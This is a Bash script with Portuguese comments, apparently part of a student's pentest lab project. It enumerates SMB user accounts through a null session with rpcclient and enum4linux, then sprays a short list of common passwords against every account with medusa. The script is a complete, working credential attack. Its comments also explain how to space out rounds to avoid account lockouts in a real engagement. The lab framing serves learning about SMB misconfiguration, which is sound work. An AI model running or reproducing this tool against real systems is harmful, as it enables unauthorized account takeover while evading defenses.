#!/bin/bash
#
# 03-smb-enum-spray.sh
#
# Esse foi o script que eu mais gostei de fazer. Ele tem duas partes:
#
# 1) Primeiro tenta descobrir quais usuarios existem na maquina via SMB,
#    usando uma "sessao nula" (ou seja, sem usuario/senha nenhum - e
#    olha que isso as vezes FUNCIONA, o que ja mostra uma falha de
#    configuracao da maquina).
# 2) Depois pega essa lista de usuarios e fica tentando ALGUMAS senhas
#    comuns contra todo mundo, uma senha por vez (isso é o tal do
#    password spraying que falei no README).
#
# Como usar: ./03-smb-enum-spray.sh <IP_DO_ALVO>

set -euo pipefail

ALVO="${1:-}"
USUARIOS_ENUMERADOS="../resultados/smb-usuarios-enumerados.txt"
SAIDA="../resultados/smb-spray-$(date +%Y%m%d-%H%M%S).txt"

# essas sao as senhas "comuns" que vou testar, uma de cada vez
SENHAS_SPRAY=(
    "password"
    "123456"
    "Senha@123"
    "Welcome1"
)

# quanto tempo espera entre uma rodada e outra (em segundos)
# deixei baixo aqui so pra nao ficar esperando muito no teste,
# mas numa situacao real o ideal seria um tempo bem maior
# (tipo 1800 = 30 minutos) pra nao disparar bloqueio de conta
INTERVALO_ENTRE_RODADAS=10

if [ -z "$ALVO" ]; then
    echo "Uso: $0 <IP_DO_ALVO>"
    echo "Tipo assim: $0 192.168.56.102"
    exit 1
fi

mkdir -p ../resultados

echo "=== PARTE 1: descobrindo os usuarios via SMB ==="
echo "[*] Checando se as portas SMB (139/445) tao abertas em $ALVO..."
nmap -p 139,445 "$ALVO" | grep -i open || {
    echo "[!] Não achei porta SMB aberta em $ALVO, confere o IP"
    exit 1
}

echo "[*] Tentando listar usuarios com rpcclient (sessao nula)..."
rpcclient -U "" -N "$ALVO" -c "enumdomusers" 2>/dev/null \
    | grep -oP '(?<=\[)[^\]]+(?=\] rid)' \
    > "$USUARIOS_ENUMERADOS" || true

if [ ! -s "$USUARIOS_ENUMERADOS" ]; then
    echo "[!] rpcclient nao trouxe nada (talvez sessao nula esteja bloqueada)"
    echo "[*] Vou tentar com enum4linux entao..."
    enum4linux -U "$ALVO" 2>/dev/null \
        | grep -oP '(?<=user:\[)[^\]]+' \
        > "$USUARIOS_ENUMERADOS" || true
fi

if [ ! -s "$USUARIOS_ENUMERADOS" ]; then
    echo "[!] Não consegui descobrir usuarios sozinho dessa vez."
    echo "[!] Pode usar a wordlist manual (../wordlists/usuarios.txt) assim:"
    echo "    medusa -h $ALVO -U ../wordlists/usuarios.txt -p 'SENHA' -M smbnt"
    exit 1
fi

echo "[*] Achei uns usuarios! Salvei em: $USUARIOS_ENUMERADOS"
echo "[*] Quantidade encontrada: $(wc -l < "$USUARIOS_ENUMERADOS")"
cat "$USUARIOS_ENUMERADOS"
echo

echo "=== PARTE 2: Password Spraying no SMB ==="
echo "[*] Vou testar 1 senha por vez contra TODOS os usuarios que achei,"
echo "    esperando ${INTERVALO_ENTRE_RODADAS}s entre cada rodada."
echo

for senha in "${SENHAS_SPRAY[@]}"; do
    echo "[*] Rodada atual, testando a senha: '$senha'"
    medusa -h "$ALVO" -U "$USUARIOS_ENUMERADOS" -p "$senha" -M smbnt -t 1 -O "$SAIDA" || true
    echo "[*] Esperando ${INTERVALO_ENTRE_RODADAS}s antes de ir pra proxima senha..."
    sleep "$INTERVALO_ENTRE_RODADAS"
done

echo
echo "[*] Acabaram as rodadas! Resultado completo em: $SAIDA"
echo "[*] Credenciais que funcionaram (se tiver alguma):"
grep -i "SUCCESS" "$SAIDA" || echo "    (nenhuma dessa vez)"
